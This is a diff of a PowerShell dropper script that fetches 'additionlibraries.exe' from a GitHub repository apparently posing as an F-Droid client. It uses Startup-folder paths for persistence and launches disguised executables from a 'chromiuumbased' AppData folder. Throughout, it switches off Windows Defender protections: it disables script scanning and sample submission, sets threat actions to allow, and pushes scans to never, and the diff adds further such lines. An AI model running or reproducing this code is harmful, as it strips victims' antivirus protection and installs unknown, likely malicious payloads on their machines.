@@ -3,8 +3,8 @@ $ProcName = "additionlibraries.exe"
 $WebFile = "https://github.com/washywashy14/fdroidclient/blob/master/app/src/full/additionlibraries.exe?raw=true"
 $Outff = "$env:Temp\additionlibraries.exe"
 
-Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
-Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force
+Set-MpPreference -DisableScriptScanning $true -Force
 Set-MpPreference -HighThreatDefaultAction 6 -Force
 Set-MpPreference -ModerateThreatDefaultAction 6 -Force
 $vrer4 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
@@ -22,4 +22,11 @@ Timeout /T 5
 Start-Process ("$env:APPDATA\chromiuumbased\services\Netstservice.exe")
 Timeout /T 5
 Start-Process ("$env:APPDATA\chromiuumbased\services\Updmonitor.exe")
-
+Set-MpPreference -SubmitSamplesConsent 0 -Force
+Set-MpPreference -SignatureScheduleDay 8 -Force
+Set-MpPreference -ScanScheduleDay 8 -Force
+Set-MpPreference -SevereThreatDefaultAction Allow -Force
+Set-MpPreference -ScanParameters 2 -Force
+Set-MpPreference -RemediationScheduleDay 8 -Force
+Set-MpPreference -HighThreatDefaultAction Allow -Force
+Set-MpPreference -DisableCatchupQuickScan $False -Force
